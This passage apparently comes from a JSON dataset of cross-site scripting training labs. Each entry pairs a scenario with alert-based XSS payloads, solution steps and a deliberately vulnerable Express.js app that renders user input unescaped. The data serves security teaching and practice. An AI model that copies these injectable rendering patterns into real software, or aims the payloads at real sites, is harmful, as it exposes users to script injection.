    "srcCode": "const express = require('express');\nconst app = express();\nlet track = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-track', (req, res) => { track = req.body.title; res.redirect('/playlist'); });\napp.get('/playlist', (req, res) => { res.send(`<html><body><div>${track}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via reviewer's position in testimonial section",
    "Lab Description": "Users providing testimonials can specify a position. This appears on the public site using innerHTML. A crafted position causes XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit testimonial with position: <img src=x onerror=alert('XSS')>",
      "Visit testimonials page",
      "Script executes below reviewer name"
    ],
    "payloads": [
      "<script>alert('testimonialXSS')</script>",
      "<img src=x onerror=alert('position')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet position = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/submit-testimonial', (req, res) => { position = req.body.position; res.redirect('/testimonials'); });\napp.get('/testimonials', (req, res) => { res.send(`<html><body><small>${position}</small></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via webhook response preview title",
    "Lab Description": "The system stores responses from webhook targets and renders titles using innerHTML. A malicious response payload can trigger stored XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send crafted webhook response with title: <script>alert('XSS')</script>",
      "Open webhook logs",
      "Observe payload execution in response preview"
    ],
    "payloads": [
      "<script>alert('webhookXSS')</script>",
      "<img src=x onerror=alert('hook')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet response = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/receive-webhook', (req, res) => { response = req.body.title; res.sendStatus(200); });\napp.get('/webhook-log', (req, res) => { res.send(`<html><body><h3>${response}</h3></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via remote config key name in DevOps dashboard",
    "Lab Description": "DevOps users can define remote config keys. Key names are rendered in real-time using innerHTML. A malicious name can result in XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create key named: <img src=x onerror=alert('XSS')>",
      "Open config dashboard",
      "Payload executes in key list"
    ],
    "payloads": [
      "<script>alert('configXSS')</script>",
      "<img src=x onerror=alert('devops')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet key = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-key', (req, res) => { key = req.body.key; res.redirect('/config'); });\napp.get('/config', (req, res) => { res.send(`<html><body><code>${key}</code></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via booking location alias in travel system",
    "Lab Description": "Users can define aliases for travel destinations. These appear in confirmations using innerHTML. A crafted alias causes XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Alias destination: <script>alert('XSS')</script>",
      "Make booking and receive confirmation",
      "Observe script execution in alias field"
    ],
    "payloads": [
      "<script>alert('travelXSS')</script>",
      "<img src=x onerror=alert('alias')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet alias = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-alias', (req, res) => { alias = req.body.alias; res.redirect('/confirm'); });\napp.get('/confirm', (req, res) => { res.send(`<html><body><strong>${alias}</strong></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via project milestone name in Kanban board",
    "Lab Description": "Project milestones can be named by users. These names are rendered in task boards using innerHTML. Unsanitized names cause stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Name milestone: <img src=x onerror=alert(1)>",
      "Open Kanban view",
      "Observe XSS in milestone column"
    ],
    "payloads": [
      "<script>alert('milestoneXSS')</script>",
      "<img src=x onerror=alert('kanban')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet milestone = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-milestone', (req, res) => { milestone = req.body.name; res.redirect('/board'); });\napp.get('/board', (req, res) => { res.send(`<html><body><header>${milestone}</header></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via map marker label in geo-tracking app",
    "Lab Description": "Users can place custom markers with labels. These labels are rendered using innerHTML. A malicious label causes XSS when the map is loaded.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Place marker with label: <script>alert(1)</script>",
      "Open map viewer",
      "Observe script execution"
    ],
    "payloads": [
      "<script>alert('mapXSS')</script>",
      "<img src=x onerror=alert('marker')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet marker = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-marker', (req, res) => { marker = req.body.label; res.redirect('/map'); });\napp.get('/map', (req, res) => { res.send(`<html><body><div>${marker}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via payment reference note in invoice preview",
    "Lab Description": "Users can add a reference note when paying invoices. These are displayed in preview using innerHTML. Unsanitized input leads to stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add payment note: <script>alert('XSS')</script>",
      "Download invoice preview",
      "Observe payload execution from note"
    ],
    "payloads": [
      "<script>alert('paymentXSS')</script>",
      "<img src=x onerror=alert('invoice')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet note = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/pay', (req, res) => { note = req.body.note; res.redirect('/preview'); });\napp.get('/preview', (req, res) => { res.send(`<html><body><footer>${note}</footer></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via file upload label name in document management system",
    "Lab Description": "Users can assign custom labels to uploaded files. These labels are rendered using innerHTML in the file listing panel. A crafted label can result in stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Upload a file and label it: <img src=x onerror=alert('XSS')>",
      "Navigate to file list view",
      "Observe script execution in label field"
    ],
    "payloads": [
      "<script>alert('uploadLabelXSS')</script>",
      "<img src=x onerror=alert('label')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet label = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/upload-label', (req, res) => { label = req.body.label; res.redirect('/files'); });\napp.get('/files', (req, res) => { res.send(`<html><body><span>${label}</span></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via product customization field in checkout form",
    "Lab Description": "Users can add customization notes for products. These are rendered in the order summary using innerHTML. Unsanitized notes cause stored XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Add customization: <script>alert('XSS')</script>",
      "Proceed to checkout summary",
      "Observe payload execution in customization field"
    ],
    "payloads": [
      "<script>alert('customizeXSS')</script>",
      "<img src=x onerror=alert('checkout')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet note = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/customize', (req, res) => { note = req.body.note; res.redirect('/summary'); });\napp.get('/summary', (req, res) => { res.send(`<html><body><p>${note}</p></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via bug tracker component name",
    "Lab Description": "Bug reports allow setting the affected component name. This is displayed in listings using innerHTML. A crafted name leads to stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit bug with component: <img src=x onerror=alert('XSS')>",
      "Browse bug tracker",
      "Observe script execution from component name"
    ],
    "payloads": [
      "<script>alert('componentXSS')</script>",
      "<img src=x onerror=alert('tracker')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet component = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/report', (req, res) => { component = req.body.component; res.redirect('/bugs'); });\napp.get('/bugs', (req, res) => { res.send(`<html><body><div>${component}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via API client name in token manager",
    "Lab Description": "Admins can name API clients. These names appear next to tokens using innerHTML. Malicious input leads to stored XSS in the panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add API client: <script>alert('XSS')</script>",
      "Open API token manager",
      "Observe XSS triggered from client name"
    ],
    "payloads": [
      "<script>alert('apiClientXSS')</script>",
      "<img src=x onerror=alert('client')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet client = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-client', (req, res) => { client = req.body.name; res.redirect('/tokens'); });\napp.get('/tokens', (req, res) => { res.send(`<html><body><strong>${client}</strong></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via chat bot trigger word display",
    "Lab Description": "Custom trigger words for bots are shown in logs. These are rendered using innerHTML. A malicious trigger word results in XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Define trigger: <img src=x onerror=alert(1)>",
      "Activate bot to log trigger",
      "View bot logs and observe XSS"
    ],
    "payloads": [
      "<script>alert('triggerXSS')</script>",
      "<img src=x onerror=alert('trigger')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet trigger = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-trigger', (req, res) => { trigger = req.body.word; res.redirect('/bot-log'); });\napp.get('/bot-log', (req, res) => { res.send(`<html><body><div>${trigger}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via email subject line preview",
    "Lab Description": "The email preview interface displays the subject via innerHTML. A crafted subject line can result in reflected XSS when loaded from query parameters.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Navigate to /preview?subject=<img src=x onerror=alert(1)>",
      "Observe execution from reflected subject",
      "Try encoded payloads to test filters"
    ],
    "payloads": [
      "<script>alert('emailXSS')</script>",
      "<img src=x onerror=alert('subject')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/preview', (req, res) => {\n  const subject = req.query.subject || 'No Subject';\n  res.send(`<html><body><h2>${subject}</h2></body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via CSV import confirmation screen",
    "Lab Description": "After importing CSV data, confirmation screen renders raw values via innerHTML. A crafted CSV cell value can trigger stored XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Upload CSV with cell: <img src=x onerror=alert(1)>",
      "Proceed to preview step",
      "Observe XSS execution in import review"
    ],
    "payloads": [
      "<script>alert('csvXSS')</script>",
      "<img src=x onerror=alert('csv')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet cell = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/upload-csv', (req, res) => { cell = req.body.cell; res.redirect('/confirm'); });\napp.get('/confirm', (req, res) => { res.send(`<html><body><td>${cell}</td></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via app update changelog entry",
    "Lab Description": "Developers can write changelogs. Entries are rendered via innerHTML in the version viewer. A malicious changelog causes persistent XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Publish changelog: <script>alert('XSS')</script>",
      "View app update history",
      "Payload executes from entry text"
    ],
    "payloads": [
      "<script>alert('changelogXSS')</script>",
      "<img src=x onerror=alert('update')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet changelog = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/update', (req, res) => { changelog = req.body.log; res.redirect('/changelog'); });\napp.get('/changelog', (req, res) => { res.send(`<html><body><article>${changelog}</article></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via social media group description",
    "Lab Description": "Group creators can set descriptions. Descriptions are shown via innerHTML in group pages. A crafted description causes stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create group with: <img src=x onerror=alert(1)>",
      "Open the group page",
      "Script executes on page load"
    ],
    "payloads": [
      "<script>alert('groupDescXSS')</script>",
      "<img src=x onerror=alert('social')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet desc = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-group', (req, res) => { desc = req.body.desc; res.redirect('/group'); });\napp.get('/group', (req, res) => { res.send(`<html><body><p>${desc}</p></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via feedback widget suggestion field",
    "Lab Description": "Users can leave suggestions via a floating widget. Suggestions appear in the admin panel using innerHTML. Unsanitized input triggers stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit suggestion: <script>alert('XSS')</script>",
      "Login to admin feedback page",
      "Observe execution from stored suggestion"
    ],
    "payloads": [
      "<script>alert('widgetXSS')</script>",
      "<img src=x onerror=alert('feedback')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet suggestion = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/feedback', (req, res) => { suggestion = req.body.text; res.redirect('/admin-feedback'); });\napp.get('/admin-feedback', (req, res) => { res.send(`<html><body><li>${suggestion}</li></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via video comment timestamp tag",
    "Lab Description": "Users can leave timestamp-tagged comments on videos. These timestamps are rendered using innerHTML. A malicious timestamp tag can trigger stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a comment with tag: <img src=x onerror=alert('XSS')>",
      "Play video and hover on timestamps",
      "Script executes from tag rendering"
    ],
    "payloads": [
      "<script>alert('timestampXSS')</script>",
      "<img src=x onerror=alert('comment')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet tag = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/comment', (req, res) => { tag = req.body.timestamp; res.redirect('/video'); });\napp.get('/video', (req, res) => { res.send(`<html><body><span>${tag}</span></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via IoT device debug log tag",
    "Lab Description": "IoT logs allow custom tags. These tags are reflected in logs using innerHTML. Malicious tags can trigger stored XSS in admin dashboards.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send log entry with tag: <script>alert('XSS')</script>",
      "Open device logs in admin panel",
      "Observe payload execution"
    ],
    "payloads": [
      "<script>alert('iotLogXSS')</script>",
      "<img src=x onerror=alert('log')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet tag = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/log-tag', (req, res) => { tag = req.body.tag; res.redirect('/logs'); });\napp.get('/logs', (req, res) => { res.send(`<html><body><code>${tag}</code></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via QR code label in asset management system",
    "Lab Description": "Labels assigned to assets are shown with the QR code using innerHTML. A malicious label can cause XSS on asset inspection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Assign label: <img src=x onerror=alert('XSS')>",
      "Scan or load QR preview",
      "Observe script execution near QR render"
    ],
    "payloads": [
      "<script>alert('qrLabelXSS')</script>",
      "<img src=x onerror=alert('qr')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet label = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-asset', (req, res) => { label = req.body.label; res.redirect('/asset'); });\napp.get('/asset', (req, res) => { res.send(`<html><body><p>${label}</p></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via live stream chat poll option text",
    "Lab Description": "Live polls in stream chats allow user-submitted options. These are inserted via innerHTML. A crafted poll option causes stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add option: <img src=x onerror=alert('XSS')>",
      "Start the poll and wait for results",
      "Observe script execution in poll UI"
    ],
    "payloads": [
      "<script>alert('pollOptionXSS')</script>",
      "<img src=x onerror=alert('vote')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet option = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-option', (req, res) => { option = req.body.option; res.redirect('/poll'); });\napp.get('/poll', (req, res) => { res.send(`<html><body><li>${option}</li></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via release note entry in CI/CD tool",
    "Lab Description": "DevOps users can write release notes. These are rendered in dashboards using innerHTML. Unsanitized notes trigger persistent XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Write note: <img src=x onerror=alert('XSS')>",
      "Open release logs",
      "Payload executes inside the release preview"
    ],
    "payloads": [
      "<script>alert('releaseXSS')</script>",
      "<img src=x onerror=alert('ci')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet note = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/release', (req, res) => { note = req.body.note; res.redirect('/releases'); });\napp.get('/releases', (req, res) => { res.send(`<html><body><article>${note}</article></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via game character nickname field",
    "Lab Description": "Players can assign nicknames to characters. These names are shown in the scoreboard using innerHTML. A malicious nickname causes XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Set nickname: <script>alert('XSS')</script>",
      "Join a public match and view scoreboard",
      "Observe script execution"
    ],
    "payloads": [
      "<script>alert('nicknameXSS')</script>",
      "<img src=x onerror=alert('game')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet nickname = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/nickname', (req, res) => { nickname = req.body.name; res.redirect('/scoreboard'); });\napp.get('/scoreboard', (req, res) => { res.send(`<html><body><td>${nickname}</td></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via virtual tour stop title",
    "Lab Description": "Admins can name virtual stops in a tour. Titles are rendered via innerHTML. Unsanitized input causes stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create stop titled: <script>alert('XSS')</script>",
      "View tour interface",
      "Observe script execution in stop title"
    ],
    "payloads": [
      "<script>alert('tourXSS')</script>",
      "<img src=x onerror=alert('stop')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet stop = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-stop', (req, res) => { stop = req.body.title; res.redirect('/tour'); });\napp.get('/tour', (req, res) => { res.send(`<html><body><h2>${stop}</h2></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via AI prompt history entry",
    "Lab Description": "Prompt history is saved and rendered using innerHTML. A crafted prompt string can result in stored XSS when revisiting history.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Enter prompt: <img src=x onerror=alert('XSS')>",
      "Navigate to prompt history",
      "Observe payload execution"
    ],
    "payloads": [
      "<script>alert('aiPromptXSS')</script>",
      "<img src=x onerror=alert('prompt')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet prompt = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/save-prompt', (req, res) => { prompt = req.body.text; res.redirect('/history'); });\napp.get('/history', (req, res) => { res.send(`<html><body><div>${prompt}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via external service alias in integrations dashboard",
    "Lab Description": "Users can create aliases for external services. These aliases are rendered via innerHTML in the integrations panel. A malicious alias causes stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create alias: <script>alert('XSS')</script>",
      "Open integrations dashboard",
      "Observe script execution"
    ],
    "payloads": [
      "<script>alert('integrationXSS')</script>",
      "<img src=x onerror=alert('alias')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet alias = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-alias', (req, res) => { alias = req.body.alias; res.redirect('/integrations'); });\napp.get('/integrations', (req, res) => { res.send(`<html><body><span>${alias}</span></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via user-created playlist folder name",
    "Lab Description": "Users can group playlists into folders. Folder names are rendered via innerHTML. A crafted folder name causes XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Name folder: <img src=x onerror=alert('XSS')>",
      "Open playlist manager",
      "Observe script execution in folder display"
    ],
    "payloads": [
      "<script>alert('playlistXSS')</script>",
      "<img src=x onerror=alert('folder')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet folder = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-folder', (req, res) => { folder = req.body.name; res.redirect('/playlists'); });\napp.get('/playlists', (req, res) => { res.send(`<html><body><div>${folder}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via custom calendar event title",
    "Lab Description": "Users can create calendar events with titles. These titles are rendered using innerHTML in event popups. A crafted title causes stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create event titled: <img src=x onerror=alert('XSS')>",
      "Open calendar and click the event",
      "Observe script execution in popup"
    ],
    "payloads": [
      "<script>alert('calendarXSS')</script>",
      "<img src=x onerror=alert('event')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet eventTitle = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-event', (req, res) => { eventTitle = req.body.title; res.redirect('/calendar'); });\napp.get('/calendar', (req, res) => { res.send(`<html><body><div>${eventTitle}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via invoice recipient name in billing dashboard",
    "Lab Description": "Invoices include recipient names displayed using innerHTML. A crafted name can trigger XSS when viewing invoice history.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send invoice to: <script>alert('XSS')</script>",
      "Open billing history",
      "Script executes from recipient name"
    ],
    "payloads": [
      "<script>alert('invoiceXSS')</script>",
      "<img src=x onerror=alert('recipient')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet recipient = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/send-invoice', (req, res) => { recipient = req.body.name; res.redirect('/invoices'); });\napp.get('/invoices', (req, res) => { res.send(`<html><body><h3>${recipient}</h3></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via push notification preview content",
    "Lab Description": "Push notifications can be previewed before sending. The content is rendered using innerHTML. Malicious content triggers reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Go to /preview?content=<script>alert(1)</script>",
      "Observe reflected payload in notification preview",
      "Payload executes on page load"
    ],
    "payloads": [
      "<script>alert('pushXSS')</script>",
      "<img src=x onerror=alert('preview')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/preview', (req, res) => {\n  const content = req.query.content || 'Hello!';\n  res.send(`<html><body><div>${content}</div></body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via voice assistant custom command name",
    "Lab Description": "Users can define voice commands. These names are rendered using innerHTML in the web dashboard. A crafted command causes persistent XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create command: <script>alert('XSS')</script>",
      "Visit assistant dashboard",
      "Script executes from command display"
    ],
    "payloads": [
      "<script>alert('voiceXSS')</script>",
      "<img src=x onerror=alert('voice')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet command = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-command', (req, res) => { command = req.body.command; res.redirect('/assistant'); });\napp.get('/assistant', (req, res) => { res.send(`<html><body><button>${command}</button></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via survey question field in feedback system",
    "Lab Description": "Admins can add survey questions. Questions are rendered via innerHTML in response forms. A crafted question leads to stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create question: <img src=x onerror=alert(1)>",
      "View the survey as a user",
      "Script executes in the question header"
    ],
    "payloads": [
      "<script>alert('surveyXSS')</script>",
      "<img src=x onerror=alert('question')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet question = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-question', (req, res) => { question = req.body.text; res.redirect('/survey'); });\napp.get('/survey', (req, res) => { res.send(`<html><body><label>${question}</label></body></html>`); });\napp.listen(3000);"
  },
  {
  "Lab scenario": "Stored XSS in Feedback Widget",
  "Lab Description": "The feedback widget stores user-submitted feedback and displays it for admin review. The text is injected into the DOM using innerHTML without escaping, allowing stored XSS.\nTo solve: Submit a feedback entry with script code.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Submit feedback with a script tag via /feedback.",
    "View feedback via /admin to observe XSS.",
    "Try encoded payloads or HTML event attributes.",
    "Confirm the XSS is persistent across sessions.",
    "Observe execution without admin interaction."
  ],
  "payloads": [
    "<script>alert('Feedback XSS')</script>",
    "<img src=1 onerror=alert('Stored')>",
    "<svg/onload=alert(1)>"
  ],
  "Vulnerability name": "Cross-site scripting",
  "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet feedbacks = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/feedback', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>Feedback Form</h2>\n        <form action='/submit' method='POST'>\n          <textarea name='msg' placeholder='Your feedback'></textarea>\n          <button>Send</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/submit', (req, res) => {\n  feedbacks.push(req.body.msg);\n  console.log('[SUBMIT] New feedback:', req.body.msg);\n  res.redirect('/admin');\n});\n\napp.get('/admin', (req, res) => {\n  const out = feedbacks.map(m => `<div>${m}</div>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <h2>Admin Panel</h2>\n        ${out}\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Feedback system ready'));\n"
},
{
  "Lab scenario": "Reflected XSS in Newsletter Signup Confirmation",
  "Lab Description": "After a newsletter signup, the server reflects the name parameter in a confirmation message. This allows reflected XSS via the URL.\nTo solve: Inject script in the name parameter.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "Navigate to /signup?name=YourName.",
    "Replace the name with a payload: <script>alert('XSS')</script>.",
    "Check the confirmation message for script execution.",
    "Test different HTML elements to bypass filters.",
    "Confirm execution before any form interaction."
  ],
  "payloads": [
    "<script>alert('Newsletter')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert(1)>"
  ],
  "Vulnerability name": "Cross-site scripting",
  "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/signup', (req, res) => {\n  const name = req.query.name || 'User';\n  console.log('[INFO] Signup from:', name);\n  res.send(`\n    <html>\n      <body>\n        <h2>Thank You</h2>\n        <p>Welcome, ${name}! You've been subscribed.</p>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Newsletter server running'));\n"
},
{
  "Lab scenario": "DOM-based XSS in Chat Preview",
  "Lab Description": "A chat preview interface uses localStorage to show the last message in the DOM via innerHTML. A crafted value can execute code when the preview is loaded.\nTo solve: Inject XSS via localStorage and refresh the preview page.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Open browser console and run: localStorage.setItem('lastMsg', '<img src=x onerror=alert(1)>').",
    "Navigate to /chat to preview the message.",
    "Observe the script executing from localStorage.",
    "Try encoded or nested payloads.",
    "Clear localStorage to reset the preview."
  ],
  "payloads": [
    "<script>alert('DOM Chat')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert(1)>"
  ],
  "Vulnerability name": "Cross-site scripting",
  "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/chat', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>Chat Preview</h2>\n        <div id='msg'></div>\n        <script>\n          const preview = localStorage.getItem('lastMsg');\n          if (preview) {\n            document.getElementById('msg').innerHTML = preview;\n            console.log('[DEBUG] Rendered preview:', preview);\n          }\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Chat preview on 3000'));\n"
},
{
  "Lab scenario": "Stored XSS in Blog Post Comments",
  "Lab Description": "A blog page lets users comment on posts. Comments are stored in memory and rendered directly on the blog without sanitization, allowing stored XSS.\nTo solve: Submit a comment containing a script and refresh the blog to see it execute.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Navigate to /blog and locate the comment form.",
    "Submit a comment with a script tag payload.",
    "Reload the page and observe persistent script execution.",
    "Try variations for different alert messages.",
    "Confirm the payload runs after page refresh."
  ],
  "payloads": [
    "<script>alert('Blog XSS')</script>",
    "<img src=1 onerror=alert('Stored')>",
    "<svg/onload=alert(1)>"
  ],
  "Vulnerability name": "Cross-site scripting",
